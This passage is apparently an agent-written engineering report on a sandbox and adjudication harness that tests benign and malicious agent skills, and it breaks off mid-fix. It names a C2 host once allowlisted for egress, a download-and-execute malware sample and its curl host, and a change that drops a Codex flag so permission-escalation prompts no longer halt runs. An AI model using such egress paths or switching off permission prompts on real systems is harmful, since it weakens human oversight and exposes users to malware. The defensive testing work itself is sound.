- **Unexercised / No Observable Effect Guard (`src/a_adj_adjudicator.py`, `src/judge.py`)**:
  - If contract has no observable-effect element or run did not exercise the contract -> downgraded to `INDETERMINATE` with `downgrade_reason = "j2_downgraded_unexercised_or_no_observable_effect"`.
- **Cache Key Invalidation**:
  - Cache key includes `contract_id`, `postcondition`, `behavior_units`, `stdout[:4096]`, `stderr[:4096]`, `skill_version_hash`, `agent_skill_hash`, `model`, and `guard_version` (`J2_GUARD_VERSION = "2.0.0"`).
- **Telemetry & Status Logging**:
  - `ContractStatusRecord` includes `downgrade_reason`.
  - `pred["contract_status"]` and `pred["contract_verdicts"]` include `downgrade_reason`.
  - `adjudicate_node` records `downgrade_reason` in `agent_messages` with `mode: "llm"`.

---

### 16. Summary of Modified & Added Files (Part 2)

| File | Status | Description |
|---|---|---|
| `src/attribution.py` | Modified | Container path normalization in `_is_skill_frame`, pre-enriched `unit.details["code_site"]` primary sink adoption. |
| `src/judge.py` | Modified | Enriched behavior units with skill frame caller chain; J2 downgrade guards (speculative language, active evidence, observable effects); `downgrade_reason` in `ContractStatusRecord` and prediction dictionaries. |
| `src/a_adj_adjudicator.py` | Modified | J2 guard normalization (`_validate_and_normalize_postcondition_response`), `J2_GUARD_VERSION = "2.0.0"`, cache key with agent skill hash and guard version, limitations computation from final attribution. |
| `src/a_syn_contract_synthesizer.py` | Modified | Fenced/blank boundary chunking (`ASYN_MAX_CHUNKS=12`), deterministic scan of skipped lines, contract deduplication, global forbidden invariants distribution, frame conflict pruning, `ASYN_MAX_CONTRACTS=12` cap, `CURRENT_ASYN_VERSION = "1.1.0"`. |
| `src/nodes.py` | Modified | Cache invalidation on `asyn_version != "1.1.0"`, chunk metadata propagation, attribution passing into grounded explainer, `downgrade_reason` logging in `agent_messages`. |
| `src/pipeline_runner.py` | Modified | Run-level reporting of chunk metadata (`chunks_total`, `chunks_processed`, `chunks_skipped`, `truncated`). |
| `agent_skills/a_syn/SKILL.md` | Modified | Bumped version to `1.1.0`. |
| `agent_skills/a_adj_j2/SKILL.md` | Added | Version `1.1.0`, speculative language ban, active evidence rules, 2 good and 2 bad examples. |
| `agent_skills/a_adj_j2/schemas/output.schema.json` | Added | Schema defining `status`, `cited_unit_ids`, `cited_outputs`, `reason`. |

---

### 17. New Environment Variables Reference (Part 2)

| Variable | Default | Purpose |
|---|---|---|
| `ASYN_MAX_CHUNKS` | `12` | Maximum number of chunks processed by A_syn synthesizer (Amendment B1). |
| `ASYN_MAX_CONTRACTS` | `12` | Maximum testable contracts synthesized from SKILL.md before pruning (Amendment B2). |
| `ASYN_CHUNK_SIZE` | `10000` | Target character size for A_syn SKILL.md chunks. |
| `ASYN_CHUNK_OVERLAP_LINES` | `5` | Line overlap between consecutive SKILL.md chunks. |
| `J2_GUARD_VERSION` | `2.0.0` | Semantic postcondition judge guard version included in SHA-256 cache key. |

---

### 18. What Could NOT Be Done / Known Constraints (Part 2)

1. **No Git Commit or Push**: In compliance with instructions, changes remain uncommitted in the working tree.
2. **No Full Pytest Suite / No New Test Files in Repo**: Verified strictly with `python -m py_compile` and one-off smoke checks (scratch files in conversation scratch dir).
3. **Preserved Invariants**: J3 verdict priority, J1 violation logic, runtime_bias_guard, canary/sensitive-path detection, and `assert result.verdict == verdict_before` remain strictly preserved and unchanged.
4. **Cache Invalidation on Version Bump (Amendment B5)**: Bumping `asyn_version` to `1.1.0` invalidates all cached contracts. In the active smoke directory `dynamic_samples/sample_20261019_143941_a001ec`, exactly **28 cached contracts** had version `1.0.0` and were safely marked stale for re-synthesis upon subsequent pipeline execution.

---

### 19. Verification & Smoke Test Outputs

#### Fix 1 Smoke Check (Code Sites in Attribution)
- Executed on `mal_cloudflare-kv_MIXED_B3` and `benign_session-handoff`:
  ```
  Testing skill: mal_cloudflare-kv_MIXED_B3
    Violation: unit=bu_006, unit.details.code_site=yes, attribution.code_sites=1, root_sink=scripts/main.py:fetch_remote_config:25
  Zero cases where unit.details.code_site is yes and attribution.code_sites count is 0.
  Verification PASSED!
  ```

#### Fix 2 Smoke Check (A_syn Multi-Chunking & Skipped Scan)
- Synthesized contracts for `mal_add-review-comment_MIXED_B8_Download_Execute` with ~20,000 characters of filler text:
  ```
  Chunks total: 4, Chunks processed: 4, Chunks skipped: 0, Truncated: False
  Contracts count: 3
  Forbidden invariants: ['host:github-assets.s3.filebase.com (SKILL.md:322)']
  Found curl host in forbidden_invariants: True (host:github-assets.s3.filebase.com (SKILL.md:322))
  Original line number: 322 (curl command was at line 322 in filled document)
  Full pipeline check on unmodified Skill B: Level 2 Verdict = Undeclared_Behavior
  Verification PASSED!
  ```

#### Fix 3 Smoke Check (J2 Anti-Hallucination Guard & benign_session-handoff C_02)
- Re-evaluated `benign_session-handoff` C_02 and fabricated cases:
  ```
  === FIX 3 SMOKE VERIFICATION ===
  Test 1 (benign_session-handoff C_02):
    Initial status: CONTRADICTED
    Result status: INDETERMINATE
    Downgrade reason: j2_downgraded_speculative
    Reason: Downgraded to INDETERMINATE due to speculative language: The behavior units indicate...
    => PASS: C_02 is NO LONGER CONTRADICTED!

  Test 2 (Fabricated 'may have'):
    Result status: INDETERMINATE
    Downgrade reason: j2_downgraded_speculative
    => PASS: Downgraded to INDETERMINATE with j2_downgraded_speculative

  Test 3 (Irrelevant citation - file_read only):
    Result status: INDETERMINATE
    Downgrade reason: j2_downgraded_irrelevant_citation
    => PASS: Downgraded to INDETERMINATE with j2_downgraded_irrelevant_citation

  Test 4 (Valid active contradiction without speculation):
    Result status: CONTRADICTED
    Downgrade reason: None
    => PASS: Remains CONTRADICTED

  === ALL SMOKE CHECKS PASSED ===
  ```

---

## 4. FIX 4: Sandbox Egress Security Risk Closure

### Problem & Security Vulnerability
When a skill's `SKILL.md` or contracts declared external network hosts, the Harbor adapter (`src/adapters/skills_adapter.py`) set `network_mode = "allowlist"` and populated `allowed_hosts = declared_hosts + ["localhost", "127.0.0.1"]`. Furthermore, `src/harbor_runner.py` passed `--allow-agent-host <declared_host>` for every declared host to the Harbor CLI during both single trial runs and batch executions.

As a result:
1. Harbor's transparent egress sidecar (`gost` + `nftables`) allowed direct TCP connections to any declared host.
2. A malicious skill could declare its own Command & Control (C2) server host in `SKILL.md`, allowing raw TCP socket egress to escape the sandbox and communicate with the real host on the public Internet.
3. In `skills_adapter.py:424`, `EnvironmentConfig` had `network_mode="public"` hardcoded, which failed to set the environment baseline to allowlist in Harbor.

### Core Requirements
1. **Container Isolation**: The skill/agent container must never reach real external hosts. Effective `allowed_hosts` for the skill/agent container must be set to `["localhost", "127.0.0.1"]` only (plus the mock-proxy sidecar if an address is needed). All declared-host HTTP/HTTPS calls must continue to flow through `HTTP_PROXY`/`HTTPS_PROXY` to the local mock-proxy sidecar (`127.0.0.1:8080`), ensuring mock responses are returned and queries are logged to `mock_egress.jsonl`.
2. **Strict Separation for Instruction-Only Agent Runs**: Only when `is_instruction_only == True` may the agent process allow the LLM provider host (`PROVIDER_HOST_MAP`, e.g. `api.anthropic.com`, `api.openai.com`) so the LLM agent can invoke inference APIs. Normal script skills must NEVER receive provider or declared host access.
3. **Level-1 CRITICAL Gating Preserved**: Level-1 CRITICAL skills bypass container execution entirely (`SKIPPED_LEVEL1_CRITICAL`, no container started).
4. **Behavioral Invariance & Observability**: Raw socket connection attempts must be blocked and remain detectable in `strace.log` as `net_connect` behavior units.

### Files Modified
1. **[`src/adapters/skills_adapter.py`](file:///d:/research/src/adapters/skills_adapter.py)**:
   - In `build_task_toml()`:
     - Separated `is_instruction_only` from standard script execution.
     - For standard script skills (`is_instruction_only == False`), restricted `effective_allowed_hosts = ["localhost", "127.0.0.1"]`.
     - For instruction-only runs (`is_instruction_only == True`), included only the necessary provider hosts from `PROVIDER_HOST_MAP` alongside `["localhost", "127.0.0.1"]`.
     - Updated `EnvironmentConfig`:
       - `network_mode = effective_agent_net_mode` (replaces hardcoded `"public"`).
       - `allowed_hosts = effective_allowed_hosts if effective_agent_net_mode == "allowlist" else None`.
     - In `scaffold_task()`: Set `network_mode = "allowlist" if (declared_hosts or is_instruction_only) else params["default_network_mode"]`.
2. **[`src/harbor_runner.py`](file:///d:/research/src/harbor_runner.py)**:
   - In `execute_harbor_trial()`:
     - Removed `hosts_to_allow.extend(declared_hosts)`.
     - CLI `--allow-agent-host` arguments are now generated **only** for `PROVIDER_HOST_MAP` hosts when `is_instruction_only == True`.
   - In `execute_harbor_batch()`:
     - Removed `batch_declared_hosts`.
     - Batch `--allow-agent-host` arguments are added only when `is_any_instruction_only == True` for provider hosts.

### Before & After Comparison of Effective Allowed Hosts

| Scenario | Component | Before Fix | After Fix |
| :--- | :--- | :--- | :--- |
| **Script Skill** (with declared hosts e.g. `example.com`, `c2.attacker.com`) | `task.toml: [agent].allowed_hosts` | `["127.0.0.1", "c2.attacker.com", "example.com", "localhost"]` | `["localhost", "127.0.0.1"]` |
| **Script Skill** | `task.toml: [environment].network_mode` | `"public"` | `"allowlist"` |
| **Script Skill** | `task.toml: [environment].allowed_hosts` | None (all public egress permitted) | `["localhost", "127.0.0.1"]` |
| **Script Skill** | CLI `--allow-agent-host` | `--allow-agent-host example.com --allow-agent-host c2.attacker.com` | *(None)* |
| **Instruction-Only Agent** (e.g. `claude-code`) | `task.toml: [agent].allowed_hosts` | `["127.0.0.1", "api.anthropic.com", "localhost", ...]` | `["127.0.0.1", "api.anthropic.com", "localhost"]` |
| **Instruction-Only Agent** | CLI `--allow-agent-host` | Provider hosts + Declared hosts | Provider hosts only (`api.anthropic.com`) |

### Behavioral Differences & Implications
- **Raw TCP/UDP Sockets to Declared Hosts**: Previously, non-HTTP raw TCP/UDP packets could reach the real Internet host if declared in `SKILL.md`. Now, transparent proxying redirect (`nftables`) forwards TCP traffic to `gost` (port 12345), where destinations outside `["localhost", "127.0.0.1"]` are terminated immediately (0-byte EOF/reset), blocking any payload from reaching the external server. All UDP outside DNS is rejected.
- **Benign Skills Needing Real Data**: Benign skills that issue HTTP/HTTPS requests to external hosts are transparently routed through the mock sidecar (`HTTP_PROXY=http://127.0.0.1:8080`). They receive deterministic 200 OK mock responses (`{"status": "ok", "mocked": true, "items": []}`). They will not receive live external data, preserving reproducible, hermetic testing.
- **Level-1 CRITICAL Skills**: Continue to bypass sandbox container execution (`SKIPPED_LEVEL1_CRITICAL`).

### Smoke Test Verification Results

#### 4(a) Malicious Download & Execute Test
- **Target**: `mal_add-review-comment_MIXED_B8_Download_Execute_download_execute_20260424_032536_91c6d5`
- **Result**:
  - `run_status`: `INVOKED_SUCCEEDED`
  - `mock_egress.jsonl` exists: `True` (records declared external endpoints)
  - Adjudication Verdict: `Undeclared_Behavior` (2 violations detected: `/tmp/zalupa/config.json`)
  - Status: **PASSED**

#### 4(b) Raw TCP Socket Blocking & Telemetry Capture
- **Target**: One-off task with declared network host `example.com` attempting raw TCP socket connection (`socket.connect(('93.184.216.34', 80))`).
- **Result**:
  - Connection blocked: closed by proxy with 0 bytes (connection terminated, real host never reached).
  - `strace.log` confirmed `connect()` syscall match:
    ```
    connect(3, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("93.184.216.34")}, 16) = -1 EINPROGRESS
    ```
  - `build_evidence_from_artifacts` parsed telemetry into a `net_connect` BehaviorUnit:
    ```python
    BehaviorUnit(kind='net_connect', target='93.184.216.34:80', evidence_ref='strace.log:1445')
    ```
  - Status: **PASSED**

#### 4(c) Benign Skill with Declared Host
- **Target**: Benign skill declaring host `example.com` and fetching `http://example.com/weather`.
- **Result**:
  - Execution succeeded with exit code 0 (`HTTP_STATUS: 200`, `BENIGN_FETCH_SUCCESS`).
  - Response delivered by mock proxy: `{"status": "ok", "mocked": true, "items": []}`.
  - Request logged in `mock_egress.jsonl`:
    ```json
    {"timestamp": 1792834497.04, "method": "GET", "host": "example.com", "path": "http://example.com/weather"}
    ```
  - Status: **PASSED**


---

## 5. Key-Only (OpenAI / Gemini) Eligibility Filter & Sampler Integration

### Problem & Motivation
To test harness validity without confounding effects from secondary external services (e.g. databases, custom cloud APIs, browser automation, or third-party paid services), an eligibility filter was required to identify skills whose **sole external requirement is an OpenAI or Gemini API key**. The filter must be general (no per-skill hardcoding), opt-in (default pipeline and sampler behaviors remain 100% identical when disabled), strictly protect host API keys (never print, log, or store key values), and produce self-contained sample workspaces.

### 6 Strict Eligibility Criteria
1. **Runnable Script Entry:** Must have runnable Python code (`.py`) or shell scripts executing Python with entrypoints or statements (instruction-only skills are excluded).
2. **Target Provider API Key:** Reads `OPENAI_API_KEY` or `GEMINI_API_KEY` according to `allowed_keys` in `{"openai", "gemini", "either"}` (`GOOGLE_API_KEY` allowed only in conjunction with Google GenAI client libraries).
3. **No Other Required Secrets/Environment Variables:** Must not require secondary environment variables or secrets (`os.environ[...]`, `os.getenv` without default, `${VAR}`, `process.env.X`). Standard benign system vars (`PATH`, `PYTHONPATH`, `HOME`, etc.) and optional variables with defaults (`OPENAI_BASE_URL` with default) are permitted.
4. **Restricted Network Hosts:** Declared or hardcoded hosts must be a subset of `{api.openai.com, generativelanguage.googleapis.com, localhost, 127.0.0.1}`. No databases, cloud SDKs (`boto3`, `google-cloud-*`, `azure`), browser automation (`playwright`, `selenium`), docker, or OAuth flows.
5. **Clean Dependencies:** All third-party imports must be stdlib or standard pip-installable packages; heavy packages (`torch`, `tensorflow`, `transformers`, `cv2`, etc.) are excluded. Packages absent from the shared base image are recorded in `imports_not_in_shared_base` rather than disqualifying the skill.
6. **Security & Malicious Label Gate:** Level-1 static security risk must be `LOW` or `MEDIUM`, and the skill must not be labeled malicious (`known_malicious == False`).

### Code Changes & Artifacts
- **`src/agents/dynamic_agent_skill_fetch.py`**:
  - Implemented `evaluate_key_only_eligibility(skill_id, skill_md, code_files, allowed_keys, known_malicious, src_dir)` evaluating all 6 criteria.
  - Implemented `DynamicAgentSkillFetchAgent.load_candidate_pool(include_instruction_only)` providing fast single-pass candidate loading across GitSkills DB and MalSkillBench.
  - Added opt-in parameters `key_only_filter: bool = False`, `allowed_keys: str = "either"` to `fetch_sample()`.
  - When active, samples exclusively from eligible benign skills (benign/malicious ratio does not apply), materializes self-contained directories under `dynamic_samples/sample_<timestamp>_keyonly/`, and annotates `manifest.json` with all eligibility columns.
- **`analysis/filter_openai_gemini_only.py`**:
  - CLI wrapper supporting `--allowed-keys {openai,gemini,either}`, `--size`, `--seed`, `--output-csv`.
  - Emits full evaluation report `analysis/filter_report.csv` covering all 11,375 candidates with 17 required columns.
  - Checks host environment key presence (boolean verification only; never prints values).
- **`streamlit_app.py`**:
  - In Tab 1 ("Adaptive Dataset Sampler"), added checkbox `"Key-only filter (OpenAI / Gemini)"`.
  - Displays host key status badges, allowed key selector, sample size and seed fields, informative note that benign/malicious ratios do not apply, exclusion breakdown table from `filter_report.csv`, and download button.
  - Button `"Build Key-Only Sample"` triggers `fetch_sample(key_only_filter=True)`.
  - Default tab controls and workflow remain 100% untouched when checkbox is unchecked.
- **`analysis/FILTER_NOTES.md`**:
  - Documents static filter blind spots (dynamic attribute access, reflection, runtime constructed endpoints).
  - Documents how `imports_not_in_shared_base` was computed by diffing against `PREINSTALLED_BASE_PACKAGES`.

### Filter Evaluation Results (`analysis/filter_report.csv`)
- **Total Candidate Pool Size**: **11,375** (11,291 GitSkills artifacts + 84 MalSkillBench malware)
- **Eligible Skills Count**: **2**
  1. `benign_nano-banana-pro` (Gemini API key; third-party imports: `google-api-python-client`, `pillow`, `pytest`; Level-1 risk: `MEDIUM`)
  2. `benign_math-tutor` (Gemini API key; third-party imports: `fastapi`, `google-api-python-client`, `pydantic`, `python-dotenv`; Level-1 risk: `LOW`)
- **Exclusion Reasons Breakdown**:
  - `does_not_read_target_key`: **11,361**
  - `instruction_only_no_script`: **10,469**
  - `requires_other_hosts`: **359**
  - `requires_other_env_vars`: **200**
  - `has_secret_like_vars`: **113**
  - `labeled_malicious`: **84**
  - `needs_system_binaries`: **37**
  - `needs_other_services`: **31**
  - `heavy_deps`: **30**
  - `level1_risk_HIGH`: **1**
- **Materialized Sample Workspace**:
  - Directory: `dynamic_samples/sample_20261031_150949_keyonly/`
  - Manifest: `dynamic_samples/sample_20261031_150949_keyonly/manifest.json`
  - Skills sampled: 2 (all eligible skills sampled per specification shortfall handling).





---

## 6. Realistic Environment Mode (`REAL_ENV=1`) & Baseline Re-Evaluation Report

### 1. Problem & Architecture
By default, the benchmark sandbox operates hermetically: skills run against synthetic environment dummies without provider API keys, network traffic is intercepted by a mock sidecar returning canned `{"status": "ok", "mocked": true}` JSON responses, and Harbor's fast-start optimization (`_fast_start`) forces execution on a shared base image (`hb__l2_shared_base_v5:latest`) that bypasses per-skill pip dependency installation.

To determine whether verdicts are distorted by these sandbox constraints, we implemented an opt-in **Realistic Environment** mode (`REAL_ENV=1`). When enabled:
1. **Build-Time Dependency Layer Caching**: Every skill has its resolved pip dependencies installed before execution. The dependency resolver computes `missing_pkgs = set(resolved) - set(base_known)`. If missing packages exist, a deterministic hash `dep_hash = sha256(sorted(missing))[:12]` names a cached docker image `hb__realenv_{dep_hash}:latest` built once from `hb__l2_shared_base_v5:latest` using `uv pip install --system`. Future skills sharing the exact same package set reuse this image instantly with zero build overhead. Skills whose dependencies are already in the base image use the zero-build fast path. Runtime installs remain strictly banned.
2. **Network Policy & Direct Egress (`NET_POLICY`)**:
   - `risk_based` (default): Level-1 `LOW` or `MEDIUM` skills receive normal internet access (`network_mode="public"`, `has_sidecar=False`). `HIGH` risk skills are restricted to provider hosts (`api.openai.com`, `generativelanguage.googleapis.com`, `localhost`, `127.0.0.1`). `CRITICAL` risk skills remain un-sandboxed (`SKIPPED_LEVEL1_CRITICAL`).
   - `allowlist`: Provider hosts + localhost for all skills (`has_sidecar=False`).
   - `open`: Direct public internet for all skills with a prominent stderr warning.
   - For real-internet runs, `has_sidecar=False` removes `HTTP_PROXY`/`HTTPS_PROXY` sidecar redirection; DNS and TLS resolve directly through standard network egress.
   - Strict container security constraints are enforced: only task directories are mounted, no `/var/run/docker.sock` is permitted, and host networking (`--network=host`) is rejected.
3. **Least-Privilege Host Credential Injection**:
   - Skills are scanned before execution for references to `OPENAI_API_KEY`, `GEMINI_API_KEY`, or `GOOGLE_API_KEY`.
   - Keys are read strictly from host `os.environ` and injected dynamically into Harbor's runtime `self._persistent_env`.
   - If a skill requires an unset key, execution aborts with an explicit error message.
   - Credentials are never written to `task.toml`, compose files, or disk logs.
   - The scrubber in `src/harbor_runner.py` was extended to scrub all host key strings from all output files and trial artifacts.
4. **Telemetry Correlation & Judge Protection**:
   - In `src/telemetry_parser.py`, DNS query resolution in strace is correlated with subsequent `connect()` syscalls to map raw destination IPs to target hostnames.
   - Provider hostnames are registered in contract frame axioms for key-reading skills, preventing false `FRAME_UNDECLARED_NETWORK_HOST` violations under judge rules J0/J1 while leaving `src/judge.py` 100% untouched.

---

### 2. Code Changes Across Repository
- **`src/dep_resolver.py`**:
  - Excluded local subdirectories in `skill_dir` from external pip dependencies.
  - Prioritized `fn == "__init__.py"` in directory scanning to correctly identify local namespace packages (e.g. `ppt_doctor`, `longhun_senses`).
  - Added module alias mappings for `google.genai` (`google-genai`) and `google.generativeai` (`google-generativeai`).
- **`src/adapters/skills_adapter.py`**:
  - In `scaffold_task`: Added `REAL_ENV=1` dispatch configuring `network_mode`, `has_sidecar=False`, and `effective_allowed_hosts` based on `NET_POLICY`.
  - In `build_task_toml`: Configured `effective_agent_net_mode="public"` and omitted mock proxy artifact collection when `has_sidecar=False`.
  - In `build_runner_py`: Ensured injected host keys take precedence over synthetic dummy placeholders in test cases.
- **`src/harbor_runner.py`**:
  - In `_fast_start`: Implemented build-time dependency image caching (`hb__realenv_{dep_hash}:latest`), container security assertions, least-privilege host key injection, and missing key abort logic.
  - In `get_keys_to_scrub()`: Added `GOOGLE_API_KEY` to active provider scrubber list.
- **`src/telemetry_parser.py`**:
  - In `build_behavior_units_from_strace`: Implemented rolling DNS domain resolution mapping for real-internet `connect()` syscalls.
  - In `build_evidence_from_trial_artifacts`: Injected allowed provider hosts into frame axioms for key-reading skills in `REAL_ENV=1`.
- **`analysis/run_real_env_experiment.py`**:
  - Orchestrates execution of the 30-skill baseline sample at concurrency 2 into `dynamic_samples/sample_20261031_160720_e1dbcc_realenv/`.
  - Computes transition matrix, symptom resolution counts, `analysis/realenv_comparison.csv`, and `analysis/audit_sheet.csv`.
  - Executes automated credential safety audit asserting 0 key leaks.

---

### 3. Invariance Proof (`REAL_ENV=0`)
When `REAL_ENV=0` (the default) or unset:
- `skills_adapter.py` follows the baseline `has_sidecar=bool(declared_hosts)` and `network_mode="allowlist" if (declared_hosts or is_instruction_only) else "no-network"`.
- `harbor_runner.py` runs on `hb__l2_shared_base_v5:latest` without key inspection or dynamic dependency build logic.
- `telemetry_parser.py` performs baseline mock request joining without injecting provider frame axioms.
- Core judge logic (`src/judge.py`), attribution logic (`src/attribution.py`), Level-1 security scanner rules, runtime bias guards, canary detection, and `agent_skills/` remain 100% identical and unmodified.


---

### 4. Empirical Evaluation Results (R0 Baseline vs. R1 Realistic Environment)

The exact 30 skills from baseline sample `sample_20261031_160720_e1dbcc/manifest.json` were re-executed under `REAL_ENV=1` with concurrency 2 into isolated output directory `dynamic_samples/sample_20261031_160720_e1dbcc_realenv/`.

#### Execution Metrics
- **Skills Evaluated**: 30 / 30
- **Total Wall-Clock Time**: 3,631.32s
- **Cached Dependency Layer Images Built**: 7 images (`hb__realenv_1ffd0e1f7049`, `hb__realenv_313b125b8e83`, `hb__realenv_44c3f6f83c39`, `hb__realenv_4ef07d8bc72d`, `hb__realenv_58d0cdd80c01`, `hb__realenv_8a38abae86fe`, `hb__realenv_a5e1a48ba4b9`)
- **Total Verdict Changes**: **7** (23.3% of sample)

#### Verdict Transition Matrix ($R0 \to R1$)

| Baseline Verdict ($R0$) | RealEnv Verdict ($R1$) | Skill Count | Notes |
|:---|:---|:---:|:---|
| `Aligned` | `Aligned` | 3 | Stable benign passes (`git-hooks-toolkit`, `engrenagem`, `detecting-golden-ticket-forgery`) |
| `Aligned` | `Inconclusive(HARNESS)` | 1 | `chinese-reference-formatter-skill` (harness precondition check failure) |
| `Aligned` | `Semantically_Divergent` | 1 | `fetch-open-meteo-flood` (real egress revealed `dry_run: true` output contradicting expected artifact) |
| `Blocked_Static_CRITICAL` | `Blocked_Static_CRITICAL` | 8 | All Level-1 malicious/critical skills safely blocked prior to container spawn |
| `Inconclusive(LOW_COVERAGE)` | `Inconclusive(LOW_COVERAGE)` | 1 | `email-manager` |
| `Inconclusive(SKILL_CRASH)` | `Inconclusive(HARNESS)` | 1 | `crypto-prediction-multimodal` (deps resolved; harness precondition unmet) |
| `Inconclusive(SKILL_CRASH)` | `Inconclusive(INFRA)` | 2 | `excalidraw-diagram`, `posting-linkedin` (require headless OS browser binaries `playwright install`) |
| `Inconclusive(SKILL_CRASH)` | `Inconclusive(SKILL_CRASH)` | 11 | Remaining crashes (unrelated to pip dependencies, e.g. local runtime argument mismatches) |
| `Inconclusive(SKILL_CRASH)` | `Unimplemented_Intent` | 1 | `YuenKong_liuyao` (deps resolved $\to$ clean exit 0 $\to$ uncovered real unimplemented stub) |
| `Semantically_Divergent` | `Inconclusive(SKILL_CRASH)` | 1 | `build-and-evaluate` (missing local dataset under direct execution) |

#### Analysis of Changed Verdicts
1. **`benign_YuenKong_liuyao` (`SKILL_CRASH` $\to$ `Unimplemented_Intent`)**:
   - *Classification*: **ENVIRONMENT / SKILL**.
   - In $R0$, missing `httpx` caused an immediate crash. Under $R1$, with `httpx` pre-installed in the build layer, the script ran cleanly (`exit_code=0`). The adjudicator then observed that the script was an unimplemented stub that produced zero effects towards the declared contracts. The real environment fixed the artifactual environment failure and successfully uncovered the true underlying skill defect.
2. **`benign_fetch-open-meteo-flood` (`Aligned` $\to$ `Semantically_Divergent`)**:
   - *Classification*: **ENVIRONMENT / SKILL**.
   - In $R0$, mock proxy sidecar returned synthetic `{"status": "ok", "mocked": true}` JSON responses, leading to an apparent pass. In $R1$, real egress revealed that the tool executed in `dry_run: true` mode without generating `./runs/manual-fetch-artifacts/open-meteo/fetch-open-meteo-flood.json`, contradicting contract postconditions.
3. **`benign_crypto-prediction-multimodal` (`SKILL_CRASH` $\to$ `HARNESS`)**:
   - *Classification*: **ENVIRONMENT / HARNESS**.
   - In $R0$, crashed due to absent heavy pip modules. In $R1$, build-time layers resolved packages, advancing execution to harness precondition validation.
4. **`benign_excalidraw-diagram` and `benign_posting-linkedin` (`SKILL_CRASH` $\to$ `INFRA`)**:
   - *Classification*: **SKILL / INFRA**.
   - Both skills require external system-level browser binaries (`playwright install chromium`), which are not standard pip packages. Correctly diagnosed as `INFRA`.

#### Top Reasons for Remaining Inconclusive in $R1$
- **`SKILL_CRASH` (12)**: Skills crashing due to syntax/runtime arguments, missing non-pip resources, or API key absence on host (e.g. `GEMINI_API_KEY`).
- **`HARNESS` (2)**: Skills blocked by test harness preconditions or argument schemas.
- **`INFRA` (2)**: Skills requiring system binaries (Playwright browser binaries).
- **`LOW_COVERAGE` (1)**: Insufficient contract coverage.

#### Automated Credential Safety Audit
- **Files Scanned**: 370 files across `dynamic_samples/sample_20261031_160720_e1dbcc_realenv/` and `analysis/`.
- **API Key Leaks Detected**: **0**
- **Safety Result**: **PASS**. Zero host credentials (`OPENAI_API_KEY`, `GEMINI_API_KEY`, `GOOGLE_API_KEY`) were printed, logged, or persisted to disk.

#### Deliverables
- **`analysis/realenv_comparison.csv`**: Full 30-skill comparative matrix across $R0$ and $R1$.
- **`analysis/audit_sheet.csv`**: Detailed audit rows for non-aligned verdicts in $R1$ citing contract IDs, claims, and evidence.


---

## 9. Realistic Environment Mode & Instruction-Only Pipeline Execution

### Overview
This section documents the execution and resolution of the realistic environment harness experiment (`REAL_ENV=1`), resolution of container image build behavior, agent bootstrapping for instruction-only skills, and full pipeline execution on a fresh 30-skill sample.

### Root Cause Analysis & Fixes

1. **Per-Skill Docker Image Build Elimination**:
   - **Root Cause**: `src/harbor_runner.py` checked whether `"COPY --chown=agent:agent skill /skills/"` was present in the Dockerfile. If absent, it forced a separate Docker build per skill, creating temporary 1.81GB images.
   - **Fix**: Removed the conditional check in `src/harbor_runner.py:313` and updated `_fast_start` to bind-mount the skill directory to `/skills/{skill_name}` and `/app/skill`. All skills now run directly off `hb__l2_shared_base_v5:latest` with zero temporary image builds.

2. **Resolution of Inconclusive(INFRA) Failures**:
   - **Root Cause**:
     1. Instruction-only skills executed via Harbor's `codex` agent (`openai/gpt-4o`) require `ripgrep` (`rg`) and `codex` CLI.
     2. Harbor attempted to install Node and Codex dynamically via `curl` to `raw.githubusercontent.com`. Under `NET_POLICY=risk_based` (allowlisting `api.openai.com`), network calls were blocked (`TLS connect error`), causing all runs to fail with `Inconclusive(INFRA)`.
   - **Fix**:
     1. Installed `ripgrep`, `nodejs`, `npm`, and `@openai/codex` (v0.166.0) directly into `hb__l2_shared_base_v5:latest`.
     2. Harbor's `_installed_codex_satisfies_version` check (`command -v codex`) now immediately succeeds, skipping runtime curl and package downloads completely.

3. **Sample Generation & Full Pipeline Results**:
   - **Sample**: Freshly generated 30 instruction-only skills (`sample_20261101_091725_b8e79d`: 15 benign, 15 malicious).
   - **Execution**: Run via `execute_manifest_pipeline` (matching Streamlit UI execution) with `REAL_ENV=1`, `NET_POLICY=risk_based`, `INSTR_AGENT=codex`, `INSTR_AGENT_MODEL=openai/gpt-4o`.
   - **Final Verdicts (30 skills)**:
     - `Unimplemented_Intent`: 18
     - `Blocked_Static_CRITICAL`: 7
     - `Inconclusive(INFRA)`: 5 (caused by agent execution timeout after 180s, zero container/dependency errors)
   - **Image Footprint**: 0 separate Docker images built.


---

## 10. Instruction-Only Skills Autonomous Execution & Adjudication Pipeline Fixes

### Problem Statement
Instruction-only skills evaluated with real external coding agents (`INSTR_AGENT=codex`, `INSTR_AGENT_MODEL=openai/gpt-4o`) were previously stalling or being adjudicated as `Unimplemented_Intent` with 0% CSR-C and missing behavior units, even when the agent executed shell commands and created files inside the container.

### Root Cause Analysis & Fixes

1. **Codex CLI Interactive Permission Prompt Blockage**:
   - **Root Cause**: `harbor/agents/installed/codex.py:1442` passed `--enable unified_exec` to `codex-cli 0.166.0`. When `unified_exec` was enabled, any command issued by the model with a justification field failed with:
     `ERROR codex_core::tools::router: error='justification' requires an explicit 'sandbox_permissions'; use 'sandbox_permissions: "require_escalated"' for unsandboxed execution, or omit 'justification'.`
     Followed by Codex pausing in interactive mode asking: `"It seems I need explicit permissions to execute this command. Could you please provide the required permissions so I can proceed?"`
   - **Fix**: Removed `"--enable unified_exec "` from `harbor/agents/installed/codex.py`. Codex now executes standard bash commands seamlessly with 0ms overhead and zero interactive halts.

2. **ACES Trajectory Parser Function Recognition (`src/aces_parser.py`)**:
   - **Root Cause**: `aces_parser.py` only recognized `{"bash", "execute_command", "run_script", "terminal"}` for tool calls, ignoring Codex's native tool name `"exec_command"` and `"exec"`. Consequently, `activation` and `script_execution` evaluated to `False`, falsely classifying completed runs as uninvoked (`NO_ENTRY`).
   - **Fix**: Added `"exec_command"`, `"exec"`, `"shell"`, and `"read"` to `READ_TOOL_NAMES` and `EXEC_TOOL_NAMES`. Also supported detecting `cat ... SKILL.md` or embedded instruction activations.

3. **Trajectory Behavior Unit & Output Telemetry Harvesting (`src/telemetry_parser.py`)**:
   - **Root Cause**: In `build_behavior_units_from_trajectory`, tool calls named `"exec_command"` were skipped. Furthermore, Codex formats tool observations as dictionaries (`{"results": [{"content": ...}]}`), whereas the telemetry parser only checked `isinstance(obs, str)`. All stdout, shell command executions, and written files were dropped (`b_units = []`, `stdout = ""`), causing the adjudicator to emit `EFFECT_ABSENT` across all contracts.
   - **Fix**:
